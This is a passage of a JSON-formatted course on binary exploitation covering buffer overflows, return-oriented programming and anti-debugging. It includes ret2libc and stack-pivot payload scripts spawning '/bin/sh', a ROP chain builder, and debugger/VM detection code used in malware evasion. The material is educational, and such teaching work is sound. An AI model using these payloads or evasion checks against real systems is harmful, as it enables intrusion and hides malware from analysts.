        "content": "• Environment variables affect stack layout\n• Input may be modified (encoding, filtering)\n• Network delays (for remote exploits)\n• Anti-debugging measures\n• Multiple architectures/OS versions"
      },
      {
        "id": "sec-41-4-4",
        "title": "41.4.4 Common Exploit Patterns",
        "content": "",
        "tableData": {
          "headers": [
            "Scenario",
            "Technique"
          ],
          "rows": [
            [
              "Local exploit",
              "Direct stack smash"
            ],
            [
              "Remote exploit",
              "Network buffer overflow"
            ],
            [
              "Format string",
              "Arbitrary read/write"
            ],
            [
              "Heap overflow",
              "Use-after-free"
            ],
            [
              "Race condition",
              "TOCTOU exploitation"
            ]
          ]
        }
      },
      {
        "id": "sec-41-4-5",
        "title": "41.4.5 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "python",
            "title": "GDB Pattern Analysis",
            "code": "# Generate pattern\npattern = b\"\"\nfor i in range(200):\n    pattern += bytes([i % 256])\n\n# Find offset in GDB\n# (gdb) pattern create 200\n# (gdb) run\n# (gdb) info eip  # eip = 0x61616161\n# (gdb) pattern offset 0x61616161\n# Found at offset: 72\n\n# Or use pwntools\nfrom pwn import *\np = process('./vulnerable')\npayload = cyclic(200)\np.sendline(payload)\np.wait()\neip = p.corefile.eip\noffset = cyclic_find(eip)\nprint(f\"Offset: {offset}\")"
          }
        ]
      }
    ],
    "exercises": [
      {
        "id": "ex-41-1",
        "title": "Exercise 41.1: Stack Canary Detection",
        "description": "Explain how stack canaries prevent stack smashing exploits.",
        "solution": "A stack canary is a random integer placed immediately before the saved return address. Before ret, the compiler checks if the canary value matches the master canary in thread-local storage. If overwritten by an overflow, __stack_chk_fail terminates the process."
      },
      {
        "id": "ex-41-2",
        "title": "Exercise 41.2: Calculate Buffer Overflow Offset",
        "description": "Given a 64-byte buffer and saved RBP, calculate the offset to overwrite return address.",
        "solution": "Offset = buffer size (64) + saved RBP (8) = 72 bytes. After 72 bytes, the next 8 bytes overwrite the return address on x86-64."
      },
      {
        "id": "ex-41-3",
        "title": "Exercise 41.3: NOP Sled Design",
        "description": "Design a payload with a 100-byte NOP sled and 24-byte shellcode.",
        "solution": "Payload: [100 bytes 0x90] [24 bytes shellcode] [padding to offset] [8 bytes return addr]. Return address should point into middle of NOP sled (e.g., sled_start + 50)."
      },
      {
        "id": "ex-41-4",
        "title": "Exercise 41.4: Bypass NX with ROP",
        "description": "Explain how Return-Oriented Programming bypasses NX protection.",
        "solution": "ROP chains together small instruction sequences (gadgets) already present in executable code segments. Since NX only prevents execution from writable memory (stack/heap), and ROP executes from read-only code segments, NX is bypassed without injecting new code."
      }
    ],
    "practiceQuestions": [
      {
        "question": "What is the purpose of Address Space Layout Randomization (ASLR)?",
        "answer": "ASLR randomizes the base memory addresses of the stack, heap, and shared libraries on every execution, preventing attackers from predicting the exact memory addresses needed for jumps or return targets. This makes exploitation significantly harder as the attacker cannot reliably locate shellcode or gadgets."
      },
      {
        "question": "How do stack canaries work and what are their limitations?",
        "answer": "Stack canaries place a random value before the saved return address. Before returning, the function checks if the canary is intact. If corrupted by an overflow, the program terminates. Limitations: can be brute-forced (single-byte canaries), leaked via information disclosure, or bypassed by overwriting only the canary value if the overflow is precise."
      },
      {
        "question": "What is the difference between NX and DEP?",
        "answer": "NX (No-Execute) is an Intel/AMD CPU feature marking memory pages as non-executable. DEP (Data Execution Prevention) is Microsoft's implementation of NX on Windows. Both prevent code execution from data pages (stack, heap), but the terminology differs by platform. They serve the same purpose: preventing injected shellcode execution."
      },
      {
        "question": "Why are NOP sleds used in buffer overflow exploits?",
        "answer": "NOP sleds provide a large \"landing pad\" (40-100+ bytes of 0x90 instructions) for imprecise jumps. Instead of needing to jump to the exact shellcode address, the attacker jumps anywhere in the sled, which slides execution to the shellcode. This increases exploit reliability when memory addresses vary slightly between runs."
      },
      {
        "question": "What is PIE and how does it differ from ASLR?",
        "answer": "PIE (Position-Independent Executable) randomizes the base address of the executable code segment itself. ASLR randomizes stack, heap, and library addresses. PIE combined with ASLR provides complete address space randomization. Without PIE, the code segment is always at the same address, simplifying ROP gadget location."
      },
      {
        "question": "How can an attacker bypass NX/DEP protections?",
        "answer": "NX can be bypassed using code reuse techniques: ROP (chaining existing code gadgets), ret2libc (calling libc functions directly), or JIT spraying. These techniques execute code already present in executable memory segments rather than injecting new code into writable memory."
      }
    ],
    "summary": [
      "Buffer overflows corrupt adjacent memory by writing past buffer boundaries.",
      "Stack overflows can overwrite return addresses to hijack control flow.",
      "NOP sleds provide landing pads for imprecise shellcode jumps.",
      "Modern defenses: canaries detect overflows, NX prevents code execution.",
      "ASLR and PIE randomize memory layout to prevent predictable addresses.",
      "Exploit development requires systematic methodology and GDB analysis.",
      "ROP bypasses NX by reusing existing code gadgets.",
      "Understanding mitigations is essential for both offensive and defensive security."
    ]
  },
  {
    "id": 42,
    "slug": "chapter-42-return-oriented-programming-rop",
    "level": 8,
    "levelTitle": "Security and Binary Exploitation",
    "title": "Chapter 42: Return-Oriented Programming (ROP) and Code Reuse",
    "subtitle": "Defeating NX/DEP: Gadget Hunting, Ret2Libc, and Stack Pivoting",
    "learningObjectives": [
      "Understand the fundamentals of Return-Oriented Programming (ROP).",
      "Understand how Return-Oriented Programming bypasses non-executable stack (NX) protections.",
      "Harvest instruction gadgets ending in ret using ROPgadget and ropper.",
      "Construct a ret2libc attack chain calling system(\"/bin/sh\").",
      "Implement stack pivoting with xchg rax, rsp; ret.",
      "Understand advanced ROP techniques (JOP, COP, call-oriented).",
      "Learn ROP chain construction and debugging methodologies.",
      "Understand ROP mitigations and defenses."
    ],
    "prerequisites": [
      "Chapters 1–41"
    ],
    "keyConcepts": [
      "ROP: Code reuse technique that chains existing instruction sequences (gadgets).",
      "Gadgets: Short instruction sequences ending in ret (e.g., pop rdi; ret).",
      "ret2libc: Calling libc functions (system, execve) without injecting code.",
      "Stack pivoting: Redirecting RSP to controlled memory (e.g., xchg rax, rsp).",
      "ROP chains: Multiple gadgets chained to perform complex operations.",
      "JOP (Jump-Oriented Programming): Uses jmp instead of ret for chaining.",
      "COP (Call-Oriented Programming): Uses call instructions for chaining.",
      "ROP mitigations: CFI, stack canaries, ASLR make ROP harder."
    ],
    "diagramType": "rop_code_reuse",
    "sections": [
      {
        "id": "sec-42-1",
        "title": "42.1 Fundamentals of ROP",
        "content": "ROP chains existing code fragments (gadgets) to perform arbitrary operations without injecting new code."
      },
      {
        "id": "sec-42-1-1",
        "title": "42.1.1 Why ROP Exists",
        "content": "NX/DEP prevents execution from stack/heap. ROP uses existing executable code segments (libc, binary) which are always readable and executable."
      },
      {
        "id": "sec-42-1-2",
        "title": "42.1.2 What is a Gadget?",
        "content": "A gadget is a short instruction sequence ending in ret:\n• pop rdi; ret (5f c3) - Load value into RDI\n• pop rsi; ret (5e c3) - Load value into RSI\n• pop rdx; ret (5a c3) - Load value into RDX\n• mov rax, rdi; ret (48 89 f8 c3) - Copy RDI to RAX\n• add rax, rsi; ret (48 01 f0 c3) - Add RSI to RAX"
      },
      {
        "id": "sec-42-1-3",
        "title": "42.1.3 How ROP Works",
        "content": "1. Attacker overwrites return address with gadget address\n2. Gadget executes, ends with ret\n3. ret pops next address from stack → next gadget\n4. Chain continues until desired operation complete"
      },
      {
        "id": "sec-42-1-4",
        "title": "42.1.4 ROP vs Shellcode",
        "content": "",
        "tableData": {
          "headers": [
            "Aspect",
            "Shellcode",
            "ROP"
          ],
          "rows": [
            [
              "Code source",
              "Injected",
              "Existing"
            ],
            [
              "NX bypass",
              "No",
              "Yes"
            ],
            [
              "Size",
              "Small",
              "Larger chains"
            ],
            [
              "Complexity",
              "Simple",
              "Complex"
            ],
            [
              "Detection",
              "Easier",
              "Harder"
            ]
          ]
        }
      },
      {
        "id": "sec-42-1-5",
        "title": "42.1.5 ROP Chain Example (Calling system(\"/bin/sh\"))",
        "content": "[pop rdi; ret]  →  Address of \"/bin/sh\"\n[system]         →  Execute system(\"/bin/sh\")"
      },
      {
        "id": "sec-42-1-6",
        "title": "42.1.6 Gadget Requirements",
        "content": "• Must end in ret for chaining\n• Useful instructions (pop, mov, arithmetic)\n• No side effects that break chain\n• Available in executable segments"
      },
      {
        "id": "sec-42-1-7",
        "title": "42.1.7 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "Finding Gadgets",
            "code": "# Using ROPgadget\nROPgadget --binary vulnerable_binary\nROPgadget --binary vulnerable_binary --only \"pop|ret\"\nROPgadget --binary libc.so.6 --only \"pop|ret\" | grep rdi\n\n# Using ropper\nropper --file vulnerable_binary\nropper --file vulnerable_binary --search \"pop rdi\"\n\n# Using objdump + grep\nobjdump -d vulnerable_binary | grep -A 1 \"pop.*%rdi\" | grep ret\n\n# Count gadgets\nROPgadget --binary vulnerable_binary | wc -l"
          }
        ]
      },
      {
        "id": "sec-42-2",
        "title": "42.2 Constructing a Ret2Libc Attack",
        "content": "ret2libc directly calls libc functions (system, execve, str_bin_sh) without shellcode."
      },
      {
        "id": "sec-42-2-1",
        "title": "42.2.1 Why ret2Libc?",
        "content": "• Bypasses NX (executes from libc, which is executable)\n• No need for shellcode injection\n• Uses known function addresses\n• More reliable than raw shellcode"
      },
      {
        "id": "sec-42-2-2",
        "title": "42.2.2 ret2libc Attack Steps",
        "content": "1. Find system() address in libc\n2. Find \"/bin/sh\" string address in libc\n3. Chain gadgets to call system(\"/bin/sh\")"
      },
      {
        "id": "sec-42-2-3",
        "title": "42.2.3 Calling Convention (x86-64 Linux)",
        "content": "• RDI = First argument\n• RSI = Second argument\n• RDX = Third argument\n• RAX = Return value / syscall number"
      },
      {
        "id": "sec-42-2-4",
        "title": "42.2.4 ret2libc Chain Structure",
        "content": "[pop rdi; ret]  →  Address of \"/bin/sh\"\n[system]        →  system(\"/bin/sh\")\n[exit]          →  Clean exit (optional)"
      },
      {
        "id": "sec-42-2-5",
        "title": "42.2.5 Finding Libc Addresses",
        "content": "1. Leak libc base from GOT/PLT\n2. Calculate offsets: function_addr = libc_base + offset\n3. Use libc database to find offsets"
      },
      {
        "id": "sec-42-2-6",
        "title": "42.2.6 Alternative: execve(\"/bin/sh\", NULL, NULL)",
        "content": "More complex but more powerful:\n\n[pop rdi; ret]  →  \"/bin/sh\"\n[pop rsi; ret]  →  0 (NULL)\n[pop rdx; ret]  →  0 (NULL)\n[pop rax; ret]  →  59 (execve syscall)\n[syscall]       →  execve(\"/bin/sh\", NULL, NULL)"
      },
      {
        "id": "sec-42-2-7",
        "title": "42.2.7 Handling ASLR",
        "content": "With ASLR enabled, libc address varies. Solutions:\n1. Information leak (format string, GOT read)\n2. Ret2plt to call read/write for leak\n3. Brute force (if fork-based server)"
      },
      {
        "id": "sec-42-2-8",
        "title": "42.2.8 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "python",
            "title": "ret2libc Exploit",
            "code": "import struct\nfrom pwn import *\n\n# Offsets (from libc database)\nsystem_offset = 0x4f550\nbin_sh_offset = 0x1b3e1a\nexit_offset = 0x44040\n\n# If libc base leaked (e.g., from format string)\nlibc_base = 0x7ffff7a00000  # Example leak\n\nsystem_addr = libc_base + system_offset\nbin_sh_addr = libc_base + bin_sh_offset\nexit_addr = libc_base + exit_offset\n\n# Gadgets\npop_rdi = 0x400736  # pop rdi; ret\n\n# Build payload\noffset = 72  # Buffer to return address\n\npayload = b\"A\" * offset\npayload += struct.pack(\"<Q\", pop_rdi)    # pop rdi; ret\npayload += struct.pack(\"<Q\", bin_sh_addr) # \"/bin/sh\"\npayload += struct.pack(\"<Q\", system_addr) # system(\"/bin/sh\")\n\nprint(f\"Payload length: {len(payload)}\")\n\n# Write to file\nwith open(\"ret2libc.bin\", \"wb\") as f:\n    f.write(payload)"
          }
        ]
      },
      {
        "id": "sec-42-3",
        "title": "42.3 Advanced ROP Techniques",
        "content": "Beyond basic ret2libc, ROP enables complex operations."
      },
      {
        "id": "sec-42-3-1",
        "title": "42.3.1 Stack Pivoting",
        "content": "Redirect RSP to controlled memory (e.g., heap, .bss):\n• xchg rax, rsp; ret - Swap RAX and RSP\n• leave; ret - MOV RSP, RBP; POP RBP; RET\n• add rsp, N; ret - Adjust stack pointer"
      },
      {
        "id": "sec-42-3-2",
        "title": "42.3.2 Memory Write via ROP",
        "content": "Write arbitrary values to arbitrary addresses:\n\n[pop rdi; ret]  →  Target address\n[pop rsi; ret]  →  Value to write\n[mov [rdi], rsi; ret]  →  Write value"
      },
      {
        "id": "sec-42-3-3",
        "title": "42.3.3 Memory Read via ROP",
        "content": "Read arbitrary memory:\n\n[pop rdi; ret]  →  Source address\n[pop rsi; ret]  →  Destination buffer\n[call read]     →  Read memory"
      },
      {
        "id": "sec-42-3-4",
        "title": "42.3.4 Conditional Logic in ROP",
        "content": "Use arithmetic and conditional jumps:\n\n[pop rax; ret]  →  Condition\n[cmp rax, 0; ret]  →  Set flags\n[je addr; ret]  →  Conditional branch"
      },
      {
        "id": "sec-42-3-5",
        "title": "42.3.5 ROP Empires",
        "content": "Large ROP chains that:\n1. Leak libc base\n2. Calculate function addresses\n3. Call multiple functions\n4. Build complex operations"
      },
      {
        "id": "sec-42-3-6",
        "title": "42.3.6 JIT ROP",
        "content": "Compile-time ROP chain generation:\n1. Scan binary for gadgets\n2. Find gadgets that satisfy operations\n3. Generate ROP chain automatically\n4. Defeats static analysis"
      },
      {
        "id": "sec-42-3-7",
        "title": "42.3.7 ROP vs JOP vs COP",
        "content": "",
        "tableData": {
          "headers": [
            "Type",
            "Chaining Instruction",
            "Pros",
            "Cons"
          ],
          "rows": [
            [
              "ROP",
              "ret",
              "Simple, universal",
              "Stack-intensive"
            ],
            [
              "JOP",
              "jmp",
              "Less stack use",
              "Fewer gadgets"
            ],
            [
              "COP",
              "call",
              "Direct calls",
              "Complex setup"
            ]
          ]
        }
      },
      {
        "id": "sec-42-3-8",
        "title": "42.3.8 ROP Mitigations",
        "content": "",
        "tableData": {
          "headers": [
            "Mitigation",
            "Bypass Difficulty"
          ],
          "rows": [
            [
              "CFI (Control-Flow Integrity)",
              "Hard - validates targets"
            ],
            [
              "Stack canaries",
              "Medium - leak canary"
            ],
            [
              "ASLR",
              "Medium - leak address"
            ],
            [
              "PIE",
              "Hard - need code leak"
            ],
            [
              "Shadow Stack",
              "Very Hard - hardware support"
            ]
          ]
        }
      },
      {
        "id": "sec-42-3-9",
        "title": "42.3.9 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "python",
            "title": "Stack Pivot ROP Chain",
            "code": "import struct\n\n# Scenario: Buffer overflow in small buffer, need to pivot to larger controlled area\n\n# Gadgets\nleave_ret = 0x400566      # leave; ret\npop_rdi = 0x400736         # pop rdi; ret\npop_rsi = 0x400734         # pop rsi; ret\npop_rax = 0x40072e         # pop rax; ret\nsyscall_ret = 0x400500     # syscall; ret\n\n# Controlled buffer on heap (0x601000)\ncontrolled_buffer = 0x601000\n\n# Initial overflow (small buffer)\noffset = 32\npayload = b\"A\" * offset\n\n# Stack pivot to controlled buffer\npayload += struct.pack(\"<Q\", leave_ret)   # mov rsp, rbp; pop rbp\npayload += struct.pack(\"<Q\", controlled_buffer)  # New RSP location\n\n# ROP chain in controlled buffer\nrop_chain = b\"\"\nrop_chain += struct.pack(\"<Q\", pop_rdi)   # pop rdi; ret\nrop_chain += struct.pack(\"<Q\", 1)         # fd = stdout\nrop_chain += struct.pack(\"<Q\", pop_rsi)   # pop rsi; ret\nrop_chain += struct.pack(\"<Q\", 0x601100)  # buffer to write\nrop_chain += struct.pack(\"<Q\", pop_rax)   # pop rax; ret\nrop_chain += struct.pack(\"<Q\", 1)         # syscall: write\nrop_chain += struct.pack(\"<Q\", syscall_ret)\n\npayload += rop_chain\nprint(f\"Payload: {len(payload)} bytes\")"
          }
        ]
      },
      {
        "id": "sec-42-4",
        "title": "42.4 ROP Chain Construction Methodology",
        "content": "Building effective ROP chains requires systematic methodology."
      },
      {
        "id": "sec-42-4-1",
        "title": "42.4.1 Step-by-Step ROP Development",
        "content": "1. Gadget Discovery: Find useful gadgets with ROPgadget/ropper\n2. Gadget Selection: Choose gadgets that perform desired operations\n3. Chain Design: Plan gadget sequence for target function call\n4. Address Calculation: Determine gadget and data addresses\n5. Chain Construction: Build payload with proper offsets\n6. Testing: Verify chain execution in GDB\n7. Optimization: Minimize chain size, improve reliability"
      },
      {
        "id": "sec-42-4-2",
        "title": "42.4.2 Essential Gadgets",
        "content": "",
        "tableData": {
          "headers": [
            "Operation",
            "Gadget",
            "Purpose"
          ],
          "rows": [
            [
              "Load arg1",
              "pop rdi; ret",
              "First function argument"
            ],
            [
              "Load arg2",
              "pop rsi; ret",
              "Second function argument"
            ],
            [
              "Load arg3",
              "pop rdx; ret",
              "Third function argument"
            ],
            [
              "Load syscall#",
              "pop rax; ret",
              "System call number"
            ],
            [
              "Memory write",
              "mov [rdi], rsi; ret",
              "Write to memory"
            ],
            [
              "Memory read",
              "mov rsi, [rdi]; ret",
              "Read from memory"
            ],
            [
              "Arithmetic",
              "add rax, rsi; ret",
              "Perform calculations"
            ],
            [
              "Stack pivot",
              "xchg rax, rsp; ret",
              "Redirect stack"
            ]
          ]
        }
      },
      {
        "id": "sec-42-4-3",
        "title": "42.4.3 ROP Chain Debugging",
        "content": "1. Set breakpoint at vulnerable function\n2. Step through payload delivery\n3. Verify each gadget executes correctly\n4. Check register and stack values after each gadget\n5. Identify where chain breaks"
      },
      {
        "id": "sec-42-4-4",
        "title": "42.4.4 Common ROP Patterns",
        "content": "• Function call: pop args, call function\n• Syscall: pop registers, syscall\n• Memory write: pop addr, pop value, write\n• Memory read: pop src, pop dst, read\n• Loop: Conditional jump back to start"
      },
      {
        "id": "sec-42-4-5",
        "title": "42.4.5 ROP Optimization",
        "content": "• Reuse gadgets when possible\n• Minimize gadget count\n• Use shorter gadgets (fewer bytes)\n• Avoid unnecessary register saves\n• Align stack properly for x86-64"
      },
      {
        "id": "sec-42-4-6",
        "title": "42.4.6 ROP Resources",
        "content": "• ROPgadget: Finding gadgets\n• ropper: Alternative gadget finder\n• rp++: Fast gadget search\n• pwntools: Python exploit development\n• ROP Emporium: Practice challenges"
      },
      {
        "id": "sec-42-4-7",
        "title": "42.4.7 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "python",
            "title": "Systematic ROP Chain Builder",
            "code": "import struct\n\nclass ROPChain:\n    def __init__(self, binary_path):\n        self.chain = b\"\"\n        self.gadgets = {}\n        \n    def add_gadget(self, name, address):\n        self.gadgets[name] = address\n        \n    def pop_rdi(self, value):\n        self.chain += struct.pack(\"<Q\", self.gadgets['pop_rdi'])\n        self.chain += struct.pack(\"<Q\", value)\n        \n    def pop_rsi(self, value):\n        self.chain += struct.pack(\"<Q\", self.gadgets['pop_rsi'])\n        self.chain += struct.pack(\"<Q\", value)\n        \n    def pop_rdx(self, value):\n        self.chain += struct.pack(\"<Q\", self.gadgets['pop_rdx'])\n        self.chain += struct.pack(\"<Q\", value)\n        \n    def call_function(self, func_addr):\n        self.chain += struct.pack(\"<Q\", func_addr)\n        \n    def syscall(self):\n        self.chain += struct.pack(\"<Q\", self.gadgets['syscall'])\n        \n    def build(self):\n        return self.chain\n\n# Example usage\nrop = ROPChain(\"./vulnerable\")\nrop.add_gadget('pop_rdi', 0x400736)\nrop.add_gadget('pop_rsi', 0x400734)\nrop.add_gadget('pop_rdx', 0x400732)\nrop.add_gadget('syscall', 0x400500)\nrop.add_gadget('system', 0x7ffff7a52390)\nrop.add_gadget('bin_sh', 0x7ffff7b99d57)\n\n# Build chain: system(\"/bin/sh\")\nrop.pop_rdi(rop.gadgets['bin_sh'])\nrop.call_function(rop.gadgets['system'])\n\npayload = b\"A\" * 72 + rop.build()\nprint(f\"Chain length: {len(rop.build())} bytes\")"
          }
        ]
      }
    ],
    "exercises": [
      {
        "id": "ex-42-1",
        "title": "Exercise 42.1: Ret2Syscall Chain Structure",
        "description": "Design a ROP chain to execute execve(\"/bin/sh\", 0, 0) via raw syscall gadgets.",
        "solution": "Chain layout: [pop rax; ret, 59] -> [pop rdi; ret, \"/bin/sh\"] -> [pop rsi; ret, 0] -> [pop rdx; ret, 0] -> [syscall; ret]. Each pop loads a register, then syscall invokes execve."
      },
      {
        "id": "ex-42-2",
        "title": "Exercise 42.2: Stack Pivot Implementation",
        "description": "Explain how to pivot the stack from a small overflow buffer to a larger controlled area.",
        "solution": "Use leave; ret (mov rsp, rbp; pop rbp) or xchg rax, rsp; ret. First overflow sets RBP to controlled buffer address. Then leave; ret pivots RSP to that buffer where the full ROP chain resides."
      },
      {
        "id": "ex-42-3",
        "title": "Exercise 42.3: Memory Write Gadget",
        "description": "Find and use a gadget that writes a value to an arbitrary memory address.",
        "solution": "Gadget: mov [rdi], rsi; ret. Chain: pop rdi; ret (target addr) -> pop rsi; ret (value) -> mov [rdi], rsi; ret (write). This writes RSI value to memory at RDI."
      },
      {
        "id": "ex-42-4",
        "title": "Exercise 42.4: ret2plt for ASLR Bypass",
        "description": "Explain how to use Procedure Linkage Table (PLT) to bypass ASLR.",
        "solution": "PLT functions are at fixed addresses (no PIE). Use PLT stubs to call read/write for leaking libc addresses. Example: call read@plt to leak GOT entry, calculate libc base, then call system."
      }
    ],
    "practiceQuestions": [
      {
        "question": "Why is ROP immune to NX/DEP memory protections?",
        "answer": "Because ROP does not execute any instructions from writable memory pages (stack or heap). It only executes instructions already located in existing, legitimate, executable code segments (such as libc or the binary itself). NX only prevents execution from data pages, not code pages."
      },
      {
        "question": "What is a ROP gadget and how is it discovered?",
        "answer": "A ROP gadget is a short instruction sequence (typically 2-5 instructions) ending in ret. Gadgets are discovered using tools like ROPgadget or ropper that scan executable segments for useful instruction patterns ending with ret (0xC3). Common gadgets include pop reg; ret for loading values."
      },
      {
        "question": "How does stack pivoting work in ROP?",
        "answer": "Stack pivoting redirects RSP to a controlled memory area. Techniques include: leave; ret (mov rsp, rbp), xchg rax, rsp, or add rsp, N. This is needed when the initial overflow buffer is too small for the full ROP chain, allowing the attacker to use a larger controlled buffer elsewhere."
      },
      {
        "question": "What is ret2libc and why is it useful?",
        "answer": "ret2libc calls libc functions directly without injecting shellcode. It is useful because: (1) bypasses NX by executing from libc (executable segment), (2) provides powerful functions like system(), execve(), (3) more reliable than raw shellcode, and (4) works even with small overflow buffers."
      },
      {
        "question": "How do you handle ASLR when building ROP chains?",
        "answer": "ASLR randomizes libc/heap addresses. Solutions: (1) Information leak to reveal addresses, (2) Use PLT functions (fixed addresses) to read GOT entries, (3) Brute force if fork-based server reuses addresses, (4) Partial overwrite to adjust addresses within known range."
      },
      {
        "question": "What are the limitations of ROP?",
        "answer": "Limitations include: (1) Requires existing useful gadgets, (2) Complex chain construction, (3) Stack-intensive (large chains need large stack), (4) Mitigated by CFI, shadow stacks, (5) Gadget availability varies by binary/compilation, (6) Difficult to debug and maintain."
      }
    ],
    "summary": [
      "ROP chains existing code gadgets to bypass NX/DEP protections.",
      "Gadgets are short instruction sequences ending in ret.",
      "ret2libc calls system/execve without shellcode injection.",
      "Stack pivoting redirects RSP to controlled memory areas.",
      "ROP enables complex operations: memory read/write, conditionals.",
      "CFI and shadow stacks are effective ROP mitigations.",
      "ROP is fundamental to modern binary exploitation.",
      "Understanding ROP is essential for both offense and defense."
    ]
  },
  {
    "id": 43,
    "slug": "chapter-43-anti-debugging-anti-analysis",
    "level": 8,
    "levelTitle": "Security and Binary Exploitation",
    "title": "Chapter 43: Anti-Debugging and Anti-Analysis Techniques",
    "subtitle": "Ptrace Detection, TracerPid Scanning, Timing Checks, and Junk Byte Obfuscation",
    "learningObjectives": [
      "Understand anti-debugging and anti-analysis concepts.",
      "Recognize anti-debugging techniques: ptrace(PTRACE_TRACEME), TracerPid, and INT 3.",
      "Detect virtual machines using CPUID hypervisor bit and artifact scanning.",
      "Deconstruct anti-disassembly tricks like overlapping instructions and opaque predicates.",
      "Bypass anti-debugging checks in GDB by patching instructions or altering register flags.",
      "Understand anti-VM and anti-sandbox techniques.",
      "Learn software obfuscation and anti-reverse engineering methods.",
      "Study real-world malware analysis case studies."
    ],
    "prerequisites": [
      "Chapters 1–42"
    ],
    "keyConcepts": [
      "ptrace: Linux debugging API; fails if debugger already attached.",
      "TracerPid: /proc/self/status field showing debugger presence.",
      "Timing checks: Detect debugger slowdowns via rdtsc/cpuid cycle counts.",
      "Anti-disassembly: Junk bytes, overlapping instructions confuse disassemblers.",
      "Opaque predicates: Always-true/false branches mislead control flow analysis.",
      "Anti-VM: Detect virtualization artifacts (CPUID, registry, files).",
      "Anti-sandbox: Detect automated analysis environments.",
      "Obfuscation: Code transformation to resist reverse engineering."
    ],
    "diagramType": "anti_debugging",
    "sections": [
      {
        "id": "sec-43-1",
        "title": "43.1 Anti-Debugging Techniques",
        "content": "Anti-debugging detects or prevents debugger attachment to protect software."
      },
      {
        "id": "sec-43-1-1",
        "title": "43.1.1 Why Anti-Debugging?",
        "content": "• Protect intellectual property\n• Prevent software piracy\n• Resist reverse engineering\n• Malware evasion (hide from analysts)"
      },
      {
        "id": "sec-43-1-2",
        "title": "43.1.2 ptrace Detection (Linux)",
        "content": "The most common technique:",
        "codeSnippets": [
          {
            "title": "ptrace Detection (Linux) — example",
            "language": "c",
            "code": "if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {\n    // Debugger detected!\n    exit(1);\n}"
          }
        ]
      },
      {
        "id": "sec-43-1-3",
        "title": "43.1.3 Explanation",
        "content": "If a debugger is already attached, ptrace fails with EPERM."
      },
      {
        "id": "sec-43-1-4",
        "title": "43.1.4 TracerPid Check",
        "content": "Read /proc/self/status for TracerPid:",
        "codeSnippets": [
          {
            "title": "TracerPid Check — example",
            "language": "c",
            "code": "int tracer_pid = 0;\nFILE *fp = fopen(\"/proc/self/status\", \"r\");\nwhile (fgets(line, sizeof(line), fp)) {\n    if (sscanf(line, \"TracerPid: %d\", &tracer_pid) == 1) {\n        if (tracer_pid != 0) {\n            // Debugger detected!\n        }\n    }\n}"
          }
        ]
      },
      {
        "id": "sec-43-1-5",
        "title": "43.1.5 Explanation",
        "content": "TracerPid > 0 means a debugger is attached."
      },
      {
        "id": "sec-43-1-6",
        "title": "43.1.6 INT 3 / INT 2D (x86)",
        "content": "Software breakpoint detection:\n• INT 3 (0xCC) is used by debuggers for breakpoints\n• Malware checks for 0xCC in code\n• INT 2D (Windows) causes exception in debugger, skips in normal execution"
      },
      {
        "id": "sec-43-1-7",
        "title": "43.1.7 IsDebuggerPresent (Windows)",
        "content": "Windows API check:",
        "codeSnippets": [
          {
            "title": "IsDebuggerPresent (Windows) — example",
            "language": "c",
            "code": "if (IsDebuggerPresent()) {\n    // Debugger detected!\n    exit(1);\n}"
          }
        ]
      },
      {
        "id": "sec-43-1-8",
        "title": "43.1.8 NtGlobalFlag (Windows)",
        "content": "Debug flags in PEB:",
        "codeSnippets": [
          {
            "title": "NtGlobalFlag (Windows) — example",
            "language": "c",
            "code": "// PEB->NtGlobalFlag\n// 0x70 = FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK\nif (NtGlobalFlag & 0x70) {\n    // Debugger detected!\n}"
          }
        ]
      },
      {
        "id": "sec-43-1-9",
        "title": "43.1.9 Hardware Breakpoint Detection",
        "content": "Check DR0-DR3 registers:",
        "codeSnippets": [
          {
            "title": "Hardware Breakpoint Detection — example",
            "language": "c",
            "code": "CONTEXT ctx;\nGetThreadContext(GetCurrentThread(), &ctx);\nif (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {\n    // Hardware breakpoints detected!\n}"
          }
        ]
      },
      {
        "id": "sec-43-1-10",
        "title": "43.1.10 Debug Object Check (Windows)",
        "content": "",
        "codeSnippets": [
          {
            "title": "Debug Object Check (Windows) — example",
            "language": "c",
            "code": "HANDLE debug_port;\nNtQueryInformationProcess(GetCurrentProcess(),\n    ProcessDebugPort, &debug_port, sizeof(debug_port), NULL);\nif (debug_port != 0) {\n    // Debugger detected!\n}"
          }
        ]
      },
      {
        "id": "sec-43-1-11",
        "title": "43.1.11 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "c",
            "title": "Anti-Debugging Example",
            "code": "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/ptrace.h>\n#include <unistd.h>\n\nint check_debugger() {\n    // Method 1: ptrace\n    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {\n        return 1;  // Debugger detected\n    }\n    \n    // Method 2: TracerPid\n    FILE *fp = fopen(\"/proc/self/status\", \"r\");\n    if (fp) {\n        char line[256];\n        while (fgets(line, sizeof(line), fp)) {\n            int tracer_pid;\n            if (sscanf(line, \"TracerPid: %d\", &tracer_pid) == 1) {\n                if (tracer_pid != 0) {\n                    fclose(fp);\n                    return 1;\n                }\n            }\n        }\n        fclose(fp);\n    }\n    \n    return 0;\n}\n\nint main() {\n    if (check_debugger()) {\n        printf(\"Debugger detected! Exiting.\\n\");\n        exit(1);\n    }\n    \n    printf(\"No debugger detected.\\n\");\n    // Normal program execution\n    return 0;\n}"
          }
        ]
      },
      {
        "id": "sec-43-2",
        "title": "43.2 Anti-VM and Anti-Sandbox Detection",
        "content": "Malware often checks for virtualization or sandbox environments."
      },
      {
        "id": "sec-43-2-1",
        "title": "43.2.1 CPUID Hypervisor Bit",
        "content": "Check for VM presence:",
        "codeSnippets": [
          {
            "title": "CPUID Hypervisor Bit — example",
            "language": "nasm",
            "code": "int is_vm() {\n    int eax, ebx, ecx, edx;\n    __cpuid(1, eax, ebx, ecx, edx);\n    return (ecx >> 31) & 1;  // Hypervisor bit\n}"
          }
        ]
      },
      {
        "id": "sec-43-2-2",
        "title": "43.2.2 Explanation",
        "content": "Hypervisor bit set in VMware, VirtualBox, Hyper-V, etc."
